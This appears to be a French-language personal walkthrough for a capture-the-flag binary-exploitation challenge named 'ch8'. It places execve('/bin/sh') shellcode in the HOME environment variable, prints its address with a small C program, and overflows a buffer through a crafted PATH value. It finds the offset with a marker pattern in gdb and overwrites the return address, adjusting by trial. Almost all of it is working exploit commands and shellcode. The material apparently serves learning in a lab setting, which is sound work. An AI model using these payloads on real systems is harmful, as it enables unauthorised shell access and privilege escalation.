## On a besoin d'un USERNAME
export USERNAME=TATA

## On met le shellcode dans la var d'env HOME, puis on ecrit un programme qui obtient l'adresse de cette variable

cd /tmp
mkdir yolo
cd yolo
vim prog.c:

#include <stdio.h>
int main ()
{
		char *shellcode = getenv("HOME");
			printf("adress: %p\n", (void*)shellcode);
				return 0;
}

gcc prog.c
cd
export HOME=`python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\x31\xd2\xcd\x80\x00\x00\x00\x00"'`

/tmp/yolo/a.out
EXEMPLE: 0xbfffff4c

export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/opt/tools/checksec/$(python -c "print ('\x00\x00\x00\x00' + '\x01\x01\x01\x01' + '\x02\x02\x02\x02' + '\x03\x03\x03\x03' + '\x04\x04\x04\x04' + '\x05\x05\x05\x05' + '\x06\x06\x06\x06' + '\x07\x07\x07\x07' + '\x08\x08\x08\x08' + '\x09\x09\x09\x09' + '\x0a\x0a\x0a\x0a' + '\x0b\x0b\x0b\x0b' + '\x0c\x0c\x0c\x0c' + '\x0d\x0d\x0d\x0d' + '\x0e\x0e\x0e\x0e' + '\x0f\x0f\x0f\x0f' + '\x10\x10\x10\x10' + '\x11\x11\x11\x11' + '\x12\x12\x12\x12' + '\x13\x13\x13\x13' + '\x14\x14\x14\x14' + '\x90\x90\x90\x90')")
gdb ch8
run
exemple: 
 EAX: 0x13131313

## On met l'adresse a la place de 0x13131313 mais egalement avant et apres au cas ou il y aurait un decalage

export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/opt/tools/checksec/$(python -c "print ('\x00\x00\x00\x00' + '\x01\x01\x01\x01' + '\x02\x02\x02\x02' + '\x03\x03\x03\x03' + '\x04\x04\x04\x04' + '\x05\x05\x05\x05' + '\x06\x06\x06\x06' + '\x07\x07\x07\x07' + '\x08\x08\x08\x08' + '\x09\x09\x09\x09' + '\x0a\x0a\x0a\x0a' + '\x0b\x0b\x0b\x0b' + '\x0c\x0c\x0c\x0c' + '\x0d\x0d\x0d\x0d' + '\x0e\x0e\x0e\x0e' + '\x0f\x0f\x0f\x0f' + '\x10\x10\x10\x10' + '\x11\x11\x11\x11' + '\x4c\xff\xff\xbf' + '\x4c\xff\xff\xbf' + '\x4c\xff\xff\xbf' + '\x90\x90\x90\x90')")

## En cas de decalage, changer ladresse a tatons pour trouver la bonne


